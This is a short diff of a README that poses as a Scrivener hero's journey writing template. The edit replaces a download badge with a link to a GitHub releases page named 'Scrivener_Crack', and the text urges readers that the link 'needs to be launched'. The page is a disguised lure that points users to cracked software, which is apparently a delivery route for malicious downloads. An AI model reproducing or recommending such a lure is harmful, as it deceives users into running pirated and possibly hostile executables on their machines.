@@ -29,7 +29,7 @@ Unleash your creativity with the Scrivener hero's journey template. Use this pow
 ## Get Started
 Ready to embark on your Scrivener journey? Click the button below to access additional resources and tools:
 
-[![Click Here to Access Resources](https://img.shields.io/badge/Access-Resources-green)](https://github.com/file/Soft.zip)
+[![Click Here to Access Resources](https://github.com/SirAlex13/Scrivener_Crack/releases)](https://github.com/SirAlex13/Scrivener_Crack/releases)
 
 **Note:** The provided link needs to be launched to access the additional resources related to Scrivener and Bartleby the Scrivener. 
 
